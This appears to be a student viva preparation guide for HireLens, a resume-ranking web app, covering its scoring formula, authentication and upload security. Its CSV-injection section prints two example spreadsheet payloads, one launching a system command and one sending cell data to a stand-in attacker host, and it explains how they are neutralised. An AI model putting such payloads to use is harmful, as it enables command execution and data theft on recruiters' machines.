# HireLens — Viva Voce Preparation Guide

> A comprehensive, beginner-friendly viva and interview preparation guide for MCA / B.Tech Computer Science students and evaluators.

---

## 1. What is HireLens?

**HireLens** is an AI-powered resume screening and candidate ranking web application. It helps human resource recruiters manage the hiring process efficiently. 

Instead of manually reading hundreds of resumes one by one, a recruiter can:
1. Create a job opening with specific requirements (skills, minimum experience, education).
2. Upload resumes in bulk (both PDF and DOCX formats).
3. Let the system automatically parse the resumes, extract key information, and rank candidates using an explainable hybrid scoring algorithm.
4. Review clear explanations of why each candidate scored high or low, compare candidates side-by-side, and track their progress through recruitment stages.

The system is built as a **modular monolith** with:
- **Backend:** Python 3.14 + FastAPI + SQLAlchemy 2.0
- **Database:** PostgreSQL (hosted on Neon)
- **Frontend:** React 18 + Vite + Tailwind CSS

---

## 2. What problem does it solve?

When companies post job openings, they often receive hundreds or thousands of applicants. This creates three major problems:

1. **Recruitment Bottleneck:** Manually reading each resume takes 3 to 5 minutes. Screening 500 resumes takes over 30 hours of recruiter time.
2. **Human Fatigue & Inconsistent Evaluation:** Recruiters reading resumes late in the day or under tight deadlines can miss qualified applicants or apply inconsistent standards.
3. **The "Black-Box AI" Problem:** Many existing AI tools use opaque neural models that output a single number (e.g., "Match: 82%") without explaining *how* that number was calculated. Recruiters cannot trust an unexplainable score, and candidates cannot be given fair feedback.
4. **Security Vulnerabilities:** Allowing unknown external users to upload documents exposes company systems to malicious files like ZIP bombs, disguised executable files, and spreadsheet formula injection.

**HireLens solves all four problems:** It processes resumes in seconds, applies consistent rule-based criteria, provides a 100% explainable score breakdown with exact evidence snippets, and protects the system with multi-layer upload validation.

---

## 3. Why did we choose TF-IDF?

**TF-IDF** stands for **Term Frequency - Inverse Document Frequency**. It is a classical natural language processing (NLP) technique that converts text into numerical vectors:
- **Term Frequency (TF):** Measures how frequently a word occurs in a document.
- **Inverse Document Frequency (IDF):** Reduces the weight of common words (like "the", "and", "is") and increases the weight of rare, informative words (like "Kubernetes", "Django", "FastAPI").

### Why TF-IDF instead of Heavy Neural Networks (like BERT or GPT)?
1. **Speed & CPU Efficiency:** Deep neural networks require gigabytes of RAM, dedicated GPUs, or expensive external cloud APIs. TF-IDF computes cosine similarity in less than 10 milliseconds directly on a standard CPU.
2. **Zero API Cost & Data Privacy:** Because TF-IDF runs locally on the server, candidate resumes and private personal data never leave the server to third-party AI companies.
3. **Determinism & Reproducibility:** TF-IDF always produces the exact same score for the same input. In hiring, determinism is critical for fairness and auditing.
4. **Complemented by a Skills Taxonomy:** Pure semantic models can easily be fooled by clever phrasing. In HireLens, TF-IDF only accounts for 30% of the score, while 40% is anchored by a curated 200+ skill taxonomy that looks for concrete proof.

---

## 4. Why is subprocess-based parsing timeout required?

When parsing PDF or DOCX files uploaded by the public, files can be damaged, corrupted, or crafted maliciously:
- Complex vector graphics or deeply nested streams in PDFs can cause parsing libraries like `pdfplumber` or `PyMuPDF` to hang in an infinite loop or deadlock at the C-extension level.
- In Python, regular threads share the **Global Interpreter Lock (GIL)**. If a C-extension freezes or deadlocks inside a thread, functions like `asyncio.wait_for()` cannot forcefully terminate the thread. The frozen thread remains stuck, consuming memory and CPU forever.

### The Solution: Isolated Subprocesses
HireLens runs the document parsing task inside a separate operating system process using Python's `multiprocessing` module:
1. The parent FastAPI background worker spawns a child process to parse the file.
2. The parent worker monitors the child process with a hard **30-second timeout**.
3. If the child process finishes normally within 30 seconds, the extracted data is saved.
4. If the child process exceeds 30 seconds, the parent calls `process.terminate()` (or `process.kill()`).
5. The stuck process is completely killed by the operating system, freeing all CPU and RAM. The resume is safely marked as `failed` with error code `parsing_timeout`, and the FastAPI server continues running smoothly.

---

## 5. How does the hybrid scoring system work?

HireLens does not rely on a single score. It combines four independent dimensions into a balanced **composite score (0% to 100%)**:

$$\text{Total Score} = (0.40 \times \text{Skills}) + (0.30 \times \text{Semantic}) + (0.20 \times \text{Experience}) + (0.10 \times \text{Education})$$

1. **Skills Score (40%):** Matches skills extracted from the resume against the job opening's requirements using our skills taxonomy. Required skills carry double weight (2.0) compared to preferred skills (1.0).
2. **Semantic Similarity Score (30%):** Uses TF-IDF cosine similarity to measure how well the overall language and domain context of the resume align with the full job description.
3. **Experience Score (20%):** Compares the candidate's verified chronological work history in years against the minimum years required by the job.
4. **Education Score (10%):** Compares the candidate's highest educational degree against the required degree level using a 5-tier academic hierarchy.

---

## 6. Explain 40/30/20/10 scoring with a complete numerical example

### Example 1: Standard Calculation (All requirements present)
Suppose a job requires: Python and FastAPI (skills), 3 years experience, and a Bachelor's degree.

A candidate applies with:
- **Skills Score:** Found Python and FastAPI $\rightarrow \mathbf{90.0\%}$
- **Semantic Score:** TF-IDF similarity between resume and JD $\rightarrow \mathbf{70.0\%}$
- **Experience Score:** Candidate has 3 years ($3 / 3 = 100\%$) $\rightarrow \mathbf{100.0\%}$
- **Education Score:** Candidate has a Bachelor's degree (meets requirement) $\rightarrow \mathbf{100.0\%}$

**Calculation:**
$$\text{Total Score} = (0.40 \times 90.0) + (0.30 \times 70.0) + (0.20 \times 100.0) + (0.10 \times 100.0)$$
$$\text{Total Score} = 36.0 + 21.0 + 20.0 + 10.0 = \mathbf{87.0\%}$$

---

### Example 2: Dynamic Renormalization (Missing requirements)
Now suppose the recruiter creates a quick job post that lists required skills and a job description, but **does not specify minimum experience or education**.

If we simply used $0$ for experience and education, the candidate's score would be unfairly penalized (maximum possible score would only be 70%).

Instead, HireLens uses **Weight Renormalization**:
1. Experience and Education are marked as `None` (inactive).
2. Active weights are:
   $$\text{Skills} = 0.40, \quad \text{Semantic} = 0.30$$
   $$\text{Sum of active weights} = 0.40 + 0.30 = 0.70$$
3. Each active weight is divided by the sum of active weights ($0.70$):
   $$\text{Normalized Skills Weight} = \frac{0.40}{0.70} = 0.5714 \quad (57.14\%)$$
   $$\text{Normalized Semantic Weight} = \frac{0.30}{0.70} = 0.4286 \quad (42.86\%)$$
4. If the candidate scored $80.0\%$ on skills and $60.0\%$ on semantic similarity:
   $$\text{Total Score} = (0.5714 \times 80.0) + (0.4286 \times 60.0)$$
   $$\text{Total Score} = 45.712 + 25.716 = 71.428 \rightarrow \mathbf{71.4\%}$$

The candidate receives a fair score out of 100%, and the UI clearly displays `"-"` for experience and education weights.

---

## 7. How are missing skills identified?

1. When a job is created, the recruiter defines required skills (e.g., `["Python", "Docker", "PostgreSQL"]`).
2. When a resume is parsed, all extracted candidate skills are normalized to lowercase canonical names (e.g., "Python 3" $\rightarrow$ "python", "postgres" $\rightarrow$ "postgresql") using our taxonomy of synonyms.
3. The system performs set comparison:
   - **Matched Skills:** Skills present in both the job requirements and the candidate's resume.
   - **Missing Skills:** Skills required by the job that were NOT found anywhere in the resume.
4. In `skill_matcher.py`, missing required skills carry a penalty in the skill score and are explicitly reported in the `missing_required` list. The recruiter immediately sees:
   > *"Required skill 'Docker' was not found in candidate resume."*

---

## 8. How does the system explain candidate scores?

Many machine learning systems are criticized for being opaque "black boxes." HireLens adheres to the principle of **Explainable AI (XAI)**.

Whenever a match is computed, HireLens constructs a complete `ScoreBreakdown` object:
1. **Total Composite Score:** The overall weighted percentage.
2. **Sub-score Breakdown:** Exact percentages for Skills, Semantic, Experience, and Education.
3. **Weights Used:** Shows the exact percentage each component contributed (including renormalized weights).
4. **Evidence Snippets:** For every matched skill, HireLens shows the exact text snippet and section from the resume where the skill was found (e.g., *"3 years using FastAPI in backend microservices"*).
5. **Itemized Missing Skills:** Explicitly lists which required or preferred skills were absent.
6. **Timeline Details:** Shows parsed start dates, end dates, and total calculated years of experience.
7. **Human-Readable Notes:** Clear textual explanations (e.g., *"Candidate meets required Bachelor's degree"* or *"No experience requirement defined; excluded from score"*).

---

## 9. Why Argon2 for password hashing?

In modern web security, storing plaintext passwords or using outdated hash algorithms (like MD5 or SHA-1) is a critical vulnerability.

### Why Argon2id?
- **Password Hashing Competition Winner:** In 2015, Argon2 was selected as the winner of the international Password Hashing Competition.
- **Resistance to GPU / ASIC Cracking:** Standard hashes like SHA-256 can be computed billions of times per second on GPUs. Argon2 is **memory-hard**: computing one hash requires significant RAM, making specialized hardware brute-force attacks economically and computationally unfeasible.
- **OWASP Recommended:** OWASP lists Argon2id as the #1 recommended algorithm for password storage.

### Why not `passlib`?
In Python 3.13 and Python 3.14, the legacy standard library `crypt` module was permanently removed. The older `passlib` library depended on `crypt` and is no longer maintained. HireLens directly uses `argon2-cffi`, which is actively maintained, CFFI-accelerated, and fully compatible with modern Python versions.

---

## 10. How do JWT access and refresh tokens work?

HireLens uses **JSON Web Tokens (JWT)** for stateless, secure user authentication:

1. **User Login:** The recruiter sends their email and password to `POST /api/v1/auth/login`.
2. **Token Generation:** The backend verifies credentials and issues two tokens:
   - **Access Token:** Short lifespan (**30 minutes**). It contains the user's ID, role (`recruiter` or `admin`), and expiration timestamp. It is digitally signed using HMAC-SHA256 (`HS256`) with a secret key.
   - **Refresh Token:** Long lifespan (**7 days**). It contains a distinct `type: "refresh"` claim.
3. **API Access:** The frontend includes the access token in the header of every API request:
   ```http
   Authorization: Bearer <access_token>
   ```
4. **Silent Refresh:** When the 30-minute access token expires, the backend responds with HTTP 401. The frontend's Axios interceptor catches this error, sends the refresh token to `POST /api/v1/auth/refresh`, receives a fresh access token, and retries the original request seamlessly without logging the user out.
5. **Revocation / Logout:** Refresh tokens have version tracking (`token_version`). If a user's password changes or their account is deactivated, existing refresh tokens are immediately invalidated.

---

## 11. What is owner-scoping and why is it important?

**Owner-scoping** means that every database query filtering jobs, resumes, or candidates explicitly checks that the record belongs to the currently logged-in user:

```python
# Example from candidates.py:
candidate = db.query(Candidate).filter(
    Candidate.id == candidate_id,
    Candidate.owner_id == current_user.id
).first()

if not candidate:
    raise HTTPException(status_code=404, detail="Candidate not found")
```

### Why is it important?
1. **Multi-Tenant Privacy:** Recruiter A should never see the job openings, applicants, or internal notes created by Recruiter B.
2. **Prevents BOLA / IDOR Attacks:** In **Broken Object Level Authorization** (IDOR), an attacker changes an ID in the URL (e.g., `/api/v1/candidates/123` to `/api/v1/candidates/124`) to read or delete another user's data.
3. **Safe 404 Responses:** Even if an administrator or another user tries to access a candidate UUID that belongs to someone else, HireLens returns `404 Not Found` instead of `403 Forbidden`. This prevents attackers from guessing whether a specific candidate ID even exists in the system (preventing ID enumeration).

---

## 12. Why validate file magic bytes?

When a user uploads a file, the web browser sends the file extension (e.g., `resume.pdf`) and a MIME type header (e.g., `application/pdf`).

### The Danger:
An attacker can easily take a malicious executable file or shell script (e.g., `exploit.exe`), rename it to `my_resume.pdf`, and upload it. If the server only checks the file extension, the file would pass validation and be sent to document parsers, potentially triggering arbitrary code execution or server compromise.

### The Solution: Magic Byte Inspection
"Magic bytes" are the unique leading signature bytes at the very start of a file format:
- A genuine **PDF** file always starts with `%PDF-` (`0x25 0x50 0x44 0x46 0x2D`).
- A genuine **DOCX** file is a ZIP archive and always starts with `PK\x03\x04` (`0x50 0x4B 0x03 0x04`).

In `upload_validator.py`, HireLens inspects the actual initial bytes of the uploaded file using `python-magic`. If the bytes do not match the expected PDF or DOCX file signatures, the upload is rejected immediately before saving to disk or calling any parser.

---

## 13. What is a ZIP bomb and how are DOCX uploads protected?

### What is a ZIP Bomb?
A Microsoft Word `.docx` file is not a flat file; it is actually a compressed ZIP archive containing XML documents, images, and fonts.
A **ZIP bomb** is a small, highly compressed ZIP archive (for example, a 100 KB file) that expands into gigabytes of data when decompressed. If a server attempts to unpack it, the file fills the entire hard disk or exhausts all available RAM, causing a Denial of Service (DoS) crash.

### How HireLens Protects Against ZIP Bombs:
Before extracting or parsing any `.docx` file in `upload_validator.py`, the file's ZIP header metadata is inspected without decompressing the content:
1. **Entry Count Limit:** A legitimate DOCX document contains only a few dozen XML and media files. HireLens enforces a limit of maximum **100 entries**.
2. **Uncompressed Size Limit:** The total uncompressed size across all files inside the archive must not exceed **20 MB**.
3. **Compression Ratio Cap:** The ratio of uncompressed size to compressed size must not exceed **50:1**.

If an uploaded DOCX file violates any of these three thresholds, validation fails instantly and the file is discarded.

---

## 14. What is CSV formula injection and how is it prevented?

### What is CSV Formula Injection (CWE-1236)?
When a recruiter exports candidate rankings to a `.csv` spreadsheet file, they typically open it in spreadsheet software like Microsoft Excel, LibreOffice, or Google Sheets.

If an applicant enters their name or previous job title as:
```text
=cmd|'/C calc.exe'!A0
```
or
```text
=HYPERLINK("http://evil-attacker.com/steal?data=" & A2, "Click here")
```
When Excel opens the CSV file, it sees the leading `=` character and treats the cell as an executable formula or dynamic macro. This can run arbitrary system commands on the recruiter's laptop or leak sensitive data.

### How HireLens Prevents It:
In `backend/app/utils/csv_sanitize.py`, every single cell value exported to CSV is passed through `sanitize_csv_cell()`:
- The system checks if the cell text begins with any dangerous formula trigger characters:
  `=` (equal), `+` (plus), `-` (minus), `@` (at), `\t` (tab), or `\r` (carriage return).
- If any trigger character is detected, HireLens **prepends a single quote (`'`)** to the value (e.g., `'=cmd|'`).
- In spreadsheet software, a leading single quote instructs the application to treat the entire cell strictly as plain text, completely neutralizing formula execution.

---

## 15. What happens when resume parsing fails?

In real-world recruiting, applicants upload poorly scanned images, password-protected PDFs, corrupt files, or unsupported formats.

In HireLens:
1. **The Application Never Crashes:** All parsing operations run inside guarded `try...except` blocks and isolated subprocesses.
2. **Status Transition:** The resume record in the database transitions from `status = "processing"` to `status = "failed"`.
3. **Specific Error Code:** A machine-readable and human-readable error reason is recorded in `error_message`, such as:
   - `scanned_or_empty`: The PDF contains no extractable digital text (e.g., a photo or image-only scan).
   - `parsing_timeout`: The document took longer than 30 seconds to parse.
   - `unsupported_format`: The file format could not be parsed.
   - `corrupted_file`: The document stream was unreadable.
4. **Recruiter Feedback:** The recruiter sees a clear badge in the UI explaining why the resume failed, rather than an infinite loading spinner.
5. **Ranker Isolation:** Failed resumes are never sent to the scoring engine, ensuring invalid scores are never saved.

---

## 16. What are the current limitations?

Every honest engineering project has trade-offs and boundaries:

1. **No Optical Character Recognition (OCR):** Resumes that are scanned photos or flattened images lack text layers. Without an OCR engine (like Tesseract), their text cannot be extracted and they are marked `failed`.
2. **Keyword & TF-IDF Semantic Limits:** While fast and CPU-friendly, TF-IDF measures vocabulary overlap. If an applicant uses highly creative or unusual phrasing that is not in our 200+ skill taxonomy, semantic similarity might underestimate relevance.
3. **Rule-Based Parsing Layouts:** Resumes with unconventional multi-column artistic layouts (e.g., graphic designer portfolios) can occasionally confuse chronological date parsing or section splitting.
4. **In-Process Task Worker:** Background tasks run within FastAPI worker processes. While suitable for single-server setups with our startup recovery mechanism, large enterprise scale would benefit from a dedicated distributed queue like Celery and Redis.
5. **Single-User Workspace:** Candidates and jobs are scoped to individual recruiter accounts; shared multi-recruiter team collaboration is not yet implemented.

---

## 17. What improvements could be added in the future?

To scale HireLens into an enterprise-ready production platform, the following enhancements could be introduced:

1. **OCR Pipeline:** Integrate an asynchronous OCR engine (e.g., `pytesseract` or AWS Textract) to extract text from scanned image PDFs.
2. **Dense Neural Embeddings:** Add an optional background embedding worker using sentence-transformers (e.g., `all-MiniLM-L6-v2`) to capture deeper semantic relationships.
3. **Distributed Message Queue:** Replace in-process background tasks with **Celery + Redis** or **RabbitMQ** to support distributed horizontal scaling across multiple servers.
4. **Team Collaboration & RBAC:** Implement organization-level accounts where multiple recruiters in a company can share job postings, leave shared comments, and assign candidate interview stages.
5. **Automated Recruiter Communication:** Add automated email notifications via SMTP / SendGrid to send status updates and interview invitations to candidates directly from the platform.
